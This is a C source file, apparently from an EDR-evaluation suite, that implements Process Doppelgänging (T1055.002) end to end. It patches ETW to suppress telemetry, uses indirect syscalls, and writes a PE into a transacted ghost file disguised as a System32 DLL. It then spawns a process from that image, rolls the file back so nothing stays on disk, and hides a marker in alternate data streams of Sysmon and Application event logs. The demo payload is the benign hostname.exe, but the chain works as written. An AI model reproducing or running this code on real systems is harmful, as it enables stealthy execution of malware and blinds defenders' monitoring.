// Plan 2 — Process Doppelgänging via NTFS Transaction (T1055.002)
// NTFS TxF ghost file → SEC_IMAGE section → Create process → Rollback → Execute
// PE payload never exists on disk — diskless execution
// Pre-condition: SYSTEM or Administrator (assumed)
#include "../shared/common.h"

// ─── ETW Patching ───
static BOOL PatchEtw(void) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return FALSE;
    PBYTE pEtw = (PBYTE)GetProcAddress(ntdll, "EtwEventWrite");
    if (!pEtw) return FALSE;
    DWORD old;
    VirtualProtect(pEtw, 3, PAGE_EXECUTE_READWRITE, &old);
    pEtw[0] = 0x33; pEtw[1] = 0xC0; pEtw[2] = 0xC3; // xor eax,eax; ret
    VirtualProtect(pEtw, 3, old, &old);
    return TRUE;
}

// ─── Read a legitimate EXE from System32 to use as payload ───
// We use a real signed Microsoft binary as the "payload" — the technique
// is creating a process from a file that never existed on disk.
// The payload action (running hostname.exe) is benign; the Doppelgänging
// technique itself is what the EDR should detect.
static PBYTE ReadPayloadExe(SIZE_T* outSize) {
    WCHAR sysDir[MAX_PATH], exePath[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    // Use a small, simple EXE — hostname.exe is ~30KB
    swprintf_s(exePath, MAX_PATH, L"%s\\HOSTNAME.EXE", sysDir);

    HANDLE hFile = CreateFileW(exePath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        // Fallback: try whoami.exe
        swprintf_s(exePath, MAX_PATH, L"%s\\whoami.exe", sysDir);
        hFile = CreateFileW(exePath, GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, 0, NULL);
    }
    if (hFile == INVALID_HANDLE_VALUE) {
        // Fallback: try find.exe
        swprintf_s(exePath, MAX_PATH, L"%s\\find.exe", sysDir);
        hFile = CreateFileW(exePath, GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, 0, NULL);
    }
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) { CloseHandle(hFile); return NULL; }

    PBYTE buf = (PBYTE)malloc(size);
    if (!buf) { CloseHandle(hFile); return NULL; }

    DWORD read;
    if (!ReadFile(hFile, buf, size, &read, NULL) || read != size) {
        free(buf); CloseHandle(hFile);
        return NULL;
    }

    CloseHandle(hFile);
    *outSize = size;
    wprintf(L"(%d bytes from %s) ", size, exePath);
    return buf;
}

// ─── Build ghost file path (masquerading as legitimate System32 DLL) ───
static void BuildGhostPath(PWSTR buf, DWORD bufSize) {
    WCHAR sysDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    // Masquerade as a legitimate-sounding DLL
    // Tasks.dll is a real Windows component in some versions
    swprintf_s(buf, bufSize, L"%s\\Tasks.dll", sysDir);
}

// ─── Create NTFS transaction ───
static HANDLE CreateTransaction(void) {
    HANDLE hTx = NULL;
    // Use direct NT API (not KTM) for stealth
    NTSTATUS st = SysNtCreateTransaction(
        &hTx,
        TRANSACTION_ALL_ACCESS,
        NULL,       // ObjectAttributes
        NULL,       // TransactionGuid
        NULL,       // ResourceManager
        0,          // CreateOptions (0 = default, not TRANSACTION_DO_NOT_PROMOTE)
        0,          // Timeout (0 = infinite)
        0,          // DescriptionLength
        NULL        // Description
    );
    if (!NT_SUCCESS(st)) {
        wprintf(L"(0x%08X) ", st);
        return NULL;
    }
    return hTx;
}

// ─── Create ghost file within transaction ───
static HANDLE CreateGhostFile(HANDLE hTx, PWSTR path) {
    UNICODE_STRING pathUs;
    MyRtlInitUnicodeString(&pathUs, path);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &pathUs, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb = {0};
    HANDLE hFile = NULL;

    NTSTATUS st = SysNtCreateFile(
        &hFile,
        GENERIC_READ | GENERIC_WRITE | DELETE,
        &oa,
        &iosb,
        NULL,                           // AllocationSize
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_OVERWRITE_IF,              // CreateDisposition
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL,                           // EaBuffer
        0,                              // EaLength
        hTx                             // Transaction handle
    );

    if (!NT_SUCCESS(st)) {
        wprintf(L"(0x%08X) ", st);
        return NULL;
    }
    return hFile;
}

// ─── Write payload to ghost file ───
static BOOL WriteGhostFile(HANDLE hFile, PBYTE data, DWORD size) {
    IO_STATUS_BLOCK iosb = {0};
    NTSTATUS st = SysNtWriteFile(
        hFile,
        NULL,       // Event
        NULL,       // ApcRoutine
        NULL,       // ApcContext
        &iosb,
        data,
        size,
        NULL,       // ByteOffset (write at current position)
        NULL        // Key
    );
    return NT_SUCCESS(st) && iosb.Information == size;
}

// ─── Create SEC_IMAGE section from ghost file ───
static HANDLE CreateGhostSection(HANDLE hFile) {
    HANDLE hSection = NULL;
    NTSTATUS st = SysNtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,               // ObjectAttributes
        NULL,               // MaximumSize
        PAGE_READONLY,      // SectionPageProtection
        SEC_IMAGE,          // AllocationAttributes — KEY: kernel parses PE
        hFile               // FileHandle — the transacted (ghost) file
    );
    if (!NT_SUCCESS(st)) {
        wprintf(L"(0x%08X) ", st);
        return NULL;
    }
    return hSection;
}

// ─── Create process from ghost image section ───
static HANDLE CreateProcessFromSection(HANDLE hSection, PHANDLE phThread) {
    HANDLE hProcess = NULL;
    NTSTATUS st = SysNtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        NULL,               // ObjectAttributes
        NtCurrentProcess(), // ParentProcess
        PROCESS_CREATE_FLAGS_CREATE_SUSPENDED,  // Flags — create suspended
        hSection,           // SectionHandle
        NULL,               // DebugPort
        NULL,               // ExceptionPort
        0                   // ProcessId (0 = auto)
    );
    if (!NT_SUCCESS(st)) {
        wprintf(L"(0x%08X) ", st);
        return NULL;
    }

    // Get PID and create main thread
    typedef NTSTATUS (NTAPI* PFN_NTQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    PFN_NTQIP pNtQIP = (PFN_NTQIP)GetProcAddress(ntdll, "NtQueryInformationProcess");
    PROCESS_BASIC_INFORMATION pbi = {0};
    pNtQIP(hProcess, 0, &pbi, sizeof(pbi), NULL);

    // Create initial thread for the process
    // We need to find the entry point from the section
    // The section mapping address is at PEB+0x10 (ImageBaseAddress)
    BYTE pebData[256] = {0};
    SIZE_T bytesRead;
    // Read PEB to find image base
    SysNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, pebData, sizeof(pebData), &bytesRead);
    ULONG_PTR imageBase = *(ULONG_PTR*)(pebData + 0x10);

    // Parse PE header at image base to find entry point
    BYTE peHdr[0x1000] = {0};
    SysNtReadVirtualMemory(hProcess, (PVOID)imageBase, peHdr, sizeof(peHdr), &bytesRead);
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)peHdr;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(peHdr + dos->e_lfanew);
    PVOID entryPoint = (PVOID)(imageBase + nt->OptionalHeader.AddressOfEntryPoint);

    // Create the main thread
    HANDLE hThread = NULL;
    st = SysNtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,           // ObjectAttributes
        hProcess,
        entryPoint,     // StartAddress = PE entry point
        NULL,           // Parameter
        0,              // Flags (0 = running, but process is suspended)
        0,              // ZeroBits
        0,              // StackSize (0 = default)
        0,              // MaxStackSize (0 = default)
        NULL            // AttributeList
    );

    if (!NT_SUCCESS(st)) {
        wprintf(L"thread(0x%08X) ", st);
        SysNtClose(hProcess);
        return NULL;
    }

    if (phThread) *phThread = hThread;
    return hProcess;
}

// ─── Rollback transaction — ghost file vanishes ───
static BOOL RollbackAndCleanup(HANDLE hTx, HANDLE hSection, HANDLE hFile) {
    // Rollback the transaction first — this makes the file disappear
    if (hTx) {
        SysNtRollbackTransaction(hTx, TRUE);
        SysNtClose(hTx);
    }
    // Clean up handles (section/file handles still valid, process has references)
    if (hSection) SysNtClose(hSection);
    if (hFile) SysNtClose(hFile);
    return TRUE;
}

// ─── Main ───
int wmain(void) {
    SetConsoleOutputCP(CP_UTF8);
    wprintf(L"[*] PE Injection — Process Doppelgänging via NTFS Transaction (T1055.002)\n\n");

    // ── Step 1: Resolve indirect syscalls ──
    wprintf(L"[1] Resolving syscalls from disk ntdll.dll... ");
    if (!InitSyscallResolver()) {
        wprintf(L"FAILED (error: %d)\n", GetLastError());
        return 1;
    }
    wprintf(L"OK\n");

    // ── Step 2: Patch ETW ──
    wprintf(L"[2] Patching ETW (EtwEventWrite)... ");
    if (!PatchEtw()) { wprintf(L"FAILED\n"); return 1; }
    wprintf(L"OK\n");

    // ── Step 3: Read legitimate EXE payload ──
    wprintf(L"[3] Reading payload EXE from System32... ");
    SIZE_T payloadSize = 0;
    PBYTE payload = ReadPayloadExe(&payloadSize);
    if (!payload) { wprintf(L"FAILED\n"); return 1; }
    wprintf(L"OK\n");

    // ── Step 4: Build ghost file path ──
    WCHAR ghostPath[MAX_PATH];
    BuildGhostPath(ghostPath, MAX_PATH);
    wprintf(L"[4] Ghost file path: %s\n", ghostPath);

    // ── Step 5: Create NTFS transaction ──
    wprintf(L"[5] Creating NTFS transaction... ");
    HANDLE hTx = CreateTransaction();
    if (!hTx) {
        wprintf(L"FAILED (TxF may be disabled on this volume)\n");
        wprintf(L"      [i] TxF is enabled by default on NTFS volumes\n");
        wprintf(L"      [i] Check: fsutil behavior query TxF\n");
        free(payload);
        return 1;
    }
    wprintf(L"OK (handle=%p)\n", hTx);

    // ── Step 6: Create ghost file in transaction ──
    wprintf(L"[6] Creating ghost file in transaction... ");
    HANDLE hFile = CreateGhostFile(hTx, ghostPath);
    if (!hFile) {
        wprintf(L"FAILED\n");
        SysNtRollbackTransaction(hTx, TRUE); SysNtClose(hTx);
        free(payload);
        return 1;
    }
    wprintf(L"OK\n");

    // ── Step 7: Write payload to ghost file ──
    wprintf(L"[7] Writing PE payload to ghost file (%lld bytes)... ", payloadSize);
    if (!WriteGhostFile(hFile, payload, (DWORD)payloadSize)) {
        wprintf(L"FAILED\n");
        SysNtClose(hFile);
        SysNtRollbackTransaction(hTx, TRUE); SysNtClose(hTx);
        free(payload);
        return 1;
    }
    free(payload);
    wprintf(L"OK (file only visible in transaction)\n");

    // ── Step 8: Create SEC_IMAGE section ──
    wprintf(L"[8] Creating SEC_IMAGE section from ghost file... ");
    HANDLE hSection = CreateGhostSection(hFile);
    if (!hSection) {
        wprintf(L"FAILED\n");
        SysNtClose(hFile);
        SysNtRollbackTransaction(hTx, TRUE); SysNtClose(hTx);
        return 1;
    }
    wprintf(L"OK (kernel PE parser validated image)\n");

    // ── Step 9: Create process from ghost image ──
    wprintf(L"[9] Creating suspended process from ghost image... ");
    HANDLE hThread = NULL;
    HANDLE hProcess = CreateProcessFromSection(hSection, &hThread);
    if (!hProcess) {
        wprintf(L"FAILED\n");
        SysNtClose(hSection); SysNtClose(hFile);
        SysNtRollbackTransaction(hTx, TRUE); SysNtClose(hTx);
        return 1;
    }
    // Get PID
    typedef NTSTATUS (NTAPI* PFN_NTQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    PFN_NTQIP pNtQIP = (PFN_NTQIP)GetProcAddress(ntdll, "NtQueryInformationProcess");
    PROCESS_BASIC_INFORMATION pbi = {0};
    pNtQIP(hProcess, 0, &pbi, sizeof(pbi), NULL);
    DWORD pid = (DWORD)(ULONG_PTR)pbi.UniqueProcessId;
    wprintf(L"OK (PID=%d, ImagePath=%s)\n", pid, ghostPath);

    // ── Step 10: Rollback transaction — ghost file vanishes ──
    wprintf(L"[10] Rolling back transaction... ");
    if (!RollbackAndCleanup(hTx, hSection, hFile)) {
        wprintf(L"FAILED\n");
        return 1;
    }
    // Verify file doesn't exist on disk
    DWORD attrs = GetFileAttributesW(ghostPath);
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        wprintf(L"OK (ghost file does NOT exist on disk — confirmed)\n");
    } else {
        wprintf(L"WARN (file still exists — check TxF status)\n");
    }

    // ── Step 11: Resume process ──
    wprintf(L"[11] Resuming process... ");
    // Wait briefly to ensure rollback completed
    Sleep(100);
    SysNtResumeThread(hThread, NULL);
    wprintf(L"OK (process running with no disk file)\n");

    // ── Step 12: Output ──
    wprintf(L"[12] Writing encrypted output to ADS... ");
    WCHAR marker[512];
    SYSTEMTIME st; GetSystemTime(&st);
    swprintf_s(marker, 512,
        L"T1055.002|ProcessDoppelganging|PID=%d|GhostPath=%s|"
        L"Time=%04d-%02d-%02dT%02d:%02d:%02d|Status=OK|FileOnDisk=NO",
        pid, ghostPath,
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    SIZE_T markerSize = wcslen(marker) * sizeof(WCHAR);
    static WCHAR* adsTargets[] = {
        L"C:\\Windows\\System32\\winevt\\Logs\\"
        L"Microsoft-Windows-Sysmon%4Operational.evtx",
        L"C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
    };
    BOOL wrote = FALSE;
    for (int i = 0; i < 2; i++) {
        if (WriteToAds(adsTargets[i], L"PEINJ", (PBYTE)marker, markerSize)) {
            wprintf(L"OK (%s:PEINJ)\n", adsTargets[i]);
            wrote = TRUE; break;
        }
    }
    if (!wrote) wprintf(L"FAILED (ADS write failed)\n");

    // Wait for process to complete its task
    wprintf(L"\n[*] Waiting for process to complete (5s)... ");
    WaitForSingleObject(hProcess, 5000);
    DWORD exitCode = 0;
    GetExitCodeProcess(hProcess, &exitCode);
    wprintf(L"Process exited with code %d\n", exitCode);

    // Cleanup
    SysNtClose(hThread);
    SysNtClose(hProcess);

    wprintf(L"\n[+] Process Doppelgänging complete\n");
    wprintf(L"[+] PE payload executed from file that NEVER existed on disk\n");
    wprintf(L"[+] Bypass layers: TxF blind spot, SEC_IMAGE (kernel PE mapping),\n");
    wprintf(L"    diskless execution, no LoadLibrary, no WriteProcessMemory,\n");
    wprintf(L"    process image in Image memory type, path masquerading\n");
    return 0;
}
